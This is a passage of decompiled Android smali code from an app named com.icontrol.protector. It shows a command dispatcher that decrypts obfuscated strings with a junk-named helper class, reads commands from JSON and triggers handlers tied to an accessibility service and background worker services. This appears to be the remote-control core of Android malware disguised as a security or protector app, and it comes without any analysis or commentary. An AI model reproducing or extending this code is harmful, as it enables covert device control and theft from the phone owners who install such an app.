        0x76t
        -0x3ft
        0xft
        0x36t
        -0x2ct
        -0x69t
        -0x55t
        -0x2bt
        0x71t
    .end array-data

    :array_d
    .array-data 1
        0x66t
        0x46t
        -0x4at
        -0x8t
        -0x36t
        -0x59t
        0x15t
        -0x53t
    .end array-data
.end method

.method private q(Lorg/json/JSONObject;)V
    .locals 17

    .line 1
    move-object/from16 v1, p0

    move-object/from16 v2, p1

    const-string v3, ""

    const/16 v4, 0xd

    const/4 v5, 0x3

    const/16 v6, 0x8

    :try_start_0
    new-array v7, v5, [B

    fill-array-data v7, :array_0

    new-array v8, v6, [B

    fill-array-data v8, :array_1

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v2, v7, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v8

    if-lez v8, :cond_3

    invoke-virtual {v7}, Ljava/lang/String;->hashCode()I

    move-result v8

    const/16 v11, 0xe

    const/4 v14, 0x2

    const/16 v15, 0xa

    const/4 v13, 0x5

    const/4 v10, 0x6

    const/16 v16, 0x0

    const/4 v12, 0x1

    const/4 v9, 0x4

    sparse-switch v8, :sswitch_data_0

    goto/16 :goto_0

    :sswitch_0
    new-array v5, v13, [B

    fill-array-data v5, :array_2

    new-array v8, v6, [B

    fill-array-data v8, :array_3

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v5, v12

    goto/16 :goto_1

    :catch_0
    move-exception v0

    move-object v2, v0

    goto/16 :goto_5

    :sswitch_1
    new-array v5, v13, [B

    fill-array-data v5, :array_4

    new-array v8, v6, [B

    fill-array-data v8, :array_5

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v5, v9

    goto/16 :goto_1

    :sswitch_2
    new-array v5, v13, [B

    fill-array-data v5, :array_6

    new-array v8, v6, [B

    fill-array-data v8, :array_7

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    const/16 v5, 0x9

    goto/16 :goto_1

    :sswitch_3
    new-array v5, v9, [B

    fill-array-data v5, :array_8

    new-array v8, v6, [B

    fill-array-data v8, :array_9

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v5, v11

    goto/16 :goto_1

    :sswitch_4
    new-array v5, v9, [B

    fill-array-data v5, :array_a

    new-array v8, v6, [B

    fill-array-data v8, :array_b

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    const/16 v5, 0xc

    goto/16 :goto_1

    :sswitch_5
    new-array v8, v9, [B

    fill-array-data v8, :array_c

    new-array v13, v6, [B

    fill-array-data v13, :array_d

    invoke-static {v8, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    goto/16 :goto_1

    :sswitch_6
    new-array v5, v9, [B

    fill-array-data v5, :array_e

    new-array v8, v6, [B

    fill-array-data v8, :array_f

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v5, v4

    goto/16 :goto_1

    :sswitch_7
    new-array v5, v9, [B

    fill-array-data v5, :array_10

    new-array v8, v6, [B

    fill-array-data v8, :array_11

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    const/16 v5, 0xf

    goto/16 :goto_1

    :sswitch_8
    new-array v5, v5, [B

    fill-array-data v5, :array_12

    new-array v8, v6, [B

    fill-array-data v8, :array_13

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move/from16 v5, v16

    goto/16 :goto_1

    :sswitch_9
    new-array v5, v5, [B

    fill-array-data v5, :array_14

    new-array v8, v6, [B

    fill-array-data v8, :array_15

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v5, v13

    goto/16 :goto_1

    :sswitch_a
    new-array v5, v5, [B

    fill-array-data v5, :array_16

    new-array v8, v6, [B

    fill-array-data v8, :array_17

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v5, v6

    goto/16 :goto_1

    :sswitch_b
    new-array v5, v5, [B

    fill-array-data v5, :array_18

    new-array v8, v6, [B

    fill-array-data v8, :array_19

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v5, v14

    goto :goto_1

    :sswitch_c
    new-array v5, v14, [B

    fill-array-data v5, :array_1a

    new-array v8, v6, [B

    fill-array-data v8, :array_1b

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v5, v15

    goto :goto_1

    :sswitch_d
    new-array v5, v10, [B

    fill-array-data v5, :array_1c

    new-array v8, v6, [B

    fill-array-data v8, :array_1d

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v5, v10

    goto :goto_1

    :sswitch_e
    new-array v5, v10, [B

    fill-array-data v5, :array_1e

    new-array v8, v6, [B

    fill-array-data v8, :array_1f

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    const/4 v5, 0x7

    goto :goto_1

    :sswitch_f
    new-array v5, v10, [B

    fill-array-data v5, :array_20

    new-array v8, v6, [B

    fill-array-data v8, :array_21

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v7, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    const/16 v5, 0xb

    goto :goto_1

    :cond_0
    :goto_0
    const/4 v5, -0x1

    :goto_1
    const/16 v7, 0x12

    packed-switch v5, :pswitch_data_0

    goto/16 :goto_6

    :pswitch_0
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->t(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_1
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->s(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_2
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->p(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_3
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->r(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_4
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->u(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_5
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->o(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_6
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->g(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_7
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->j(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_8
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->l(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_9
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->n(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_a
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->m(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_b
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->h(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_c
    invoke-direct/range {p0 .. p1}, Lcom/icontrol/protector/LiveChat$a;->i(Lorg/json/JSONObject;)V

    goto/16 :goto_6

    :pswitch_d
    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v2}, Lcom/icontrol/protector/WorkServices$d;->l(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_6

    :pswitch_e
    :try_start_1
    new-array v3, v9, [B

    fill-array-data v3, :array_22

    new-array v5, v6, [B

    fill-array-data v5, :array_23

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v5, v9, [B

    fill-array-data v5, :array_24

    new-array v8, v6, [B

    fill-array-data v8, :array_25

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v3, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    new-array v5, v9, [B

    fill-array-data v5, :array_26

    new-array v8, v6, [B

    fill-array-data v8, :array_27

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1

    iget-object v5, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    sget-object v8, Lntidisestablish/neumonoul/floccinaucinih/ab;->x:Ljava/lang/String;

    invoke-static {v5, v8, v3}, Lntidisestablish/neumonoul/floccinaucinih/sq;->e(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    :catch_1
    move-exception v0

    move-object v2, v0

    goto/16 :goto_3

    :cond_1
    :goto_2
    new-array v3, v14, [B

    fill-array-data v3, :array_28

    new-array v5, v6, [B

    fill-array-data v5, :array_29

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v5, v9, [B

    fill-array-data v5, :array_2a

    new-array v8, v6, [B

    fill-array-data v8, :array_2b

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v3, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-array v3, v7, [B

    fill-array-data v3, :array_2c

    new-array v5, v6, [B

    fill-array-data v5, :array_2d

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-array v3, v9, [B

    fill-array-data v3, :array_2e

    new-array v5, v6, [B

    fill-array-data v5, :array_2f

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_3

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3, v2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    iget-object v5, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v7, v4, [B

    fill-array-data v7, :array_30

    new-array v8, v6, [B

    fill-array-data v8, :array_31

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v8, v15, [B

    fill-array-data v8, :array_32

    new-array v9, v6, [B

    fill-array-data v9, :array_33

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    new-array v9, v12, [B

    const/16 v13, 0x71

    aput-byte v13, v9, v16

    new-array v13, v6, [B

    fill-array-data v13, :array_34

    invoke-static {v9, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v8, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v2, v5, v7, v8}, Lcom/icontrol/protector/LiveChat;->l(Lcom/icontrol/protector/LiveChat;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    iget-object v5, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v7, v11, [B

    fill-array-data v7, :array_35

    new-array v8, v6, [B

    fill-array-data v8, :array_36

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v8, v15, [B

    fill-array-data v8, :array_37

    new-array v9, v6, [B

    fill-array-data v9, :array_38

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    new-array v9, v12, [B

    const/16 v11, 0x5e

    aput-byte v11, v9, v16

    new-array v11, v6, [B

    fill-array-data v11, :array_39

    invoke-static {v9, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v8, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v2, v5, v7, v8}, Lcom/icontrol/protector/LiveChat;->l(Lcom/icontrol/protector/LiveChat;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    iget-object v5, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    const/16 v7, 0x11

    new-array v7, v7, [B

    fill-array-data v7, :array_3a

    new-array v8, v6, [B

    fill-array-data v8, :array_3b

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v8, v4, [B

    fill-array-data v8, :array_3c

    new-array v9, v6, [B

    fill-array-data v9, :array_3d

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    new-array v9, v12, [B

    const/16 v11, 0x1c

    aput-byte v11, v9, v16

    new-array v11, v6, [B

    fill-array-data v11, :array_3e

    invoke-static {v9, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v8, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v2, v5, v7, v8}, Lcom/icontrol/protector/LiveChat;->l(Lcom/icontrol/protector/LiveChat;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    iget-object v5, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v7, v6, [B

    fill-array-data v7, :array_3f

    new-array v8, v6, [B

    fill-array-data v8, :array_40

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    const/16 v8, 0xb

    new-array v8, v8, [B

    fill-array-data v8, :array_41

    new-array v9, v6, [B

    fill-array-data v9, :array_42

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    new-array v9, v12, [B

    const/16 v11, 0x4c

    aput-byte v11, v9, v16

    new-array v11, v6, [B

    fill-array-data v11, :array_43

    invoke-static {v9, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v8, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v2, v5, v7, v8}, Lcom/icontrol/protector/LiveChat;->l(Lcom/icontrol/protector/LiveChat;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    iget-object v5, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    const/16 v7, 0x9

    new-array v7, v7, [B

    fill-array-data v7, :array_44

    new-array v8, v6, [B

    fill-array-data v8, :array_45

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    const/16 v8, 0xc

    new-array v8, v8, [B

    fill-array-data v8, :array_46

    new-array v9, v6, [B

    fill-array-data v9, :array_47

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    new-array v9, v12, [B

    const/16 v11, -0x7d

    aput-byte v11, v9, v16

    new-array v11, v6, [B

    fill-array-data v11, :array_48

    invoke-static {v9, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v8, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v2, v5, v7, v8}, Lcom/icontrol/protector/LiveChat;->l(Lcom/icontrol/protector/LiveChat;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    iget-object v5, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    const/4 v7, 0x7

    new-array v8, v7, [B

    fill-array-data v8, :array_49

    new-array v7, v6, [B

    fill-array-data v7, :array_4a

    invoke-static {v8, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    new-array v8, v15, [B

    fill-array-data v8, :array_4b

    new-array v9, v6, [B

    fill-array-data v9, :array_4c

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    new-array v9, v12, [B

    const/16 v11, -0x41

    aput-byte v11, v9, v16

    new-array v11, v6, [B

    fill-array-data v11, :array_4d

    invoke-static {v9, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v3, v8, v9}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v5, v7, v3}, Lcom/icontrol/protector/LiveChat;->l(Lcom/icontrol/protector/LiveChat;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    const/4 v3, 0x7

    new-array v3, v3, [B

    fill-array-data v3, :array_4e

    new-array v5, v6, [B

    fill-array-data v5, :array_4f

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    sget-object v5, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v2, v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_3

    sget-object v2, Lcom/icontrol/protector/WorkServices;->o:Lcom/icontrol/protector/AccessServices;

    const/16 v3, 0x32

    if-eqz v2, :cond_2

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v5, 0x1e

    if-lt v2, v5, :cond_2

    invoke-static {}, Lcom/icontrol/protector/WorkServices$d;->j()Z

    move-result v2

    if-nez v2, :cond_3

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v2, v3}, Lcom/icontrol/protector/WorkServices$d;->d(Landroid/content/Context;I)V

    goto/16 :goto_6

    :cond_2
    invoke-static {}, Lcom/icontrol/protector/WorkServices$d;->k()Z

    move-result v2

    if-nez v2, :cond_3

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v5, v10, [B

    fill-array-data v5, :array_50

    new-array v7, v6, [B

    fill-array-data v7, :array_51

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    const/16 v7, 0x3e8

    invoke-static {v2, v3, v5, v7}, Lcom/icontrol/protector/WorkServices$d;->b(Landroid/content/Context;ILjava/lang/String;I)V
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_6

    :goto_3
    :try_start_2
    new-array v3, v4, [B

    fill-array-data v3, :array_52

    new-array v5, v6, [B

    fill-array-data v5, :array_53

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    :goto_4
    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_6

    :pswitch_f
    :try_start_3
    new-array v5, v9, [B

    fill-array-data v5, :array_54

    new-array v8, v6, [B

    fill-array-data v8, :array_55

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_3

    new-instance v3, Lntidisestablish/neumonoul/floccinaucinih/pq;

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v2

    new-array v5, v12, [B

    const/16 v8, -0x77

    aput-byte v8, v5, v16

    new-array v8, v6, [B

    fill-array-data v8, :array_56

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-direct {v3, v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/pq;-><init>([B[B)V

    invoke-static {v3}, Lcom/icontrol/protector/LiveChat;->c(Lntidisestablish/neumonoul/floccinaucinih/pq;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto :goto_6

    :catch_2
    move-exception v0

    move-object v2, v0

    :try_start_4
    invoke-virtual {v2}, Ljava/lang/Throwable;->printStackTrace()V

    new-array v3, v7, [B

    fill-array-data v3, :array_57

    new-array v5, v6, [B

    fill-array-data v5, :array_58

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    goto :goto_4

    :goto_5
    new-array v3, v4, [B

    fill-array-data v3, :array_59

    new-array v4, v6, [B

    fill-array-data v4, :array_5a

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_3
    :goto_6
    return-void

    :sswitch_data_0
    .sparse-switch
        -0x361a401a -> :sswitch_f
        -0x361a3f94 -> :sswitch_e
        -0x31fbf1ff -> :sswitch_d
        0xc41 -> :sswitch_c
        0x178a1 -> :sswitch_b
        0x1a647 -> :sswitch_a
        0x1bde9 -> :sswitch_9
        0x1ccf0 -> :sswitch_8
        0x2e9358 -> :sswitch_7
        0x2ea350 -> :sswitch_6
        0x2ff57c -> :sswitch_5
        0x31b6ec -> :sswitch_4
        0x32c52b -> :sswitch_3
        0x59a813b -> :sswitch_2
        0x5cd06ba -> :sswitch_1
        0x650dbb8 -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :array_0
    .array-data 1
        0x6at
        -0xdt
        0x5dt
    .end array-data

    :array_1
    .array-data 1
        0x7t
        -0x80t
        0x3at
        -0x13t
        0x61t
        0x5dt
        0x3bt
        0x74t
    .end array-data

    :array_2
    .array-data 1
        0x36t
        0x69t
        0x7bt
        0x6dt
        0x47t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x59t
        0x19t
        0xft
        0x3t
        0x34t
        0x16t
        0x54t
        -0x3at
    .end array-data

    :array_4
    .array-data 1
        0x36t
        0x61t
        -0x6et
        -0x5t
        -0x13t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x50t
        0x4t
        -0x1at
        -0x68t
        -0x7bt
        0x5dt
        0x4ft
        -0x22t
    .end array-data

    :array_6
    .array-data 1
        0x6bt
        -0x3t
        -0x2ct
        0x34t
        -0x2dt
    .end array-data

    nop

    :array_7
    .array-data 1
        0x9t
        -0x71t
        -0x45t
        0x43t
        -0x60t
        0x44t
        0x3dt
        0x19t
    .end array-data

    :array_8
    .array-data 1
        0x69t
        -0x2t
        -0x7ft
        0x4t
    .end array-data

    :array_9
    .array-data 1
        0x5t
        -0x6ft
        -0x1et
        0x6ft
        0x35t
        0x37t
        -0x42t
        -0x4et
    .end array-data

    :array_a
    .array-data 1
        -0x74t
        0xft
        -0x73t
        0x3ct
    .end array-data

    :array_b
    .array-data 1
        -0x1at
        0x6at
        -0x12t
        0x48t
        -0x2ct
        0x44t
        0x6t
        0x7at
    .end array-data

    :array_c
    .array-data 1
        0x66t
        0x5ct
        -0x5t
        -0x36t
    .end array-data

    :array_d
    .array-data 1
        0x0t
        0x35t
        -0x69t
        -0x51t
        -0x35t
        -0x8t
        -0x3ct
        0x67t
    .end array-data

    :array_e
    .array-data 1
        0x35t
        0x7dt
        0x1et
        -0xat
    .end array-data

    :array_f
    .array-data 1
        0x56t
        0x11t
        0x77t
        -0x7at
        0x66t
        -0x47t
        -0x2ct
        -0x5t
    .end array-data

    :array_10
    .array-data 1
        0x3t
        0x1et
        0x26t
        0x3et
    .end array-data

    :array_11
    .array-data 1
        0x60t
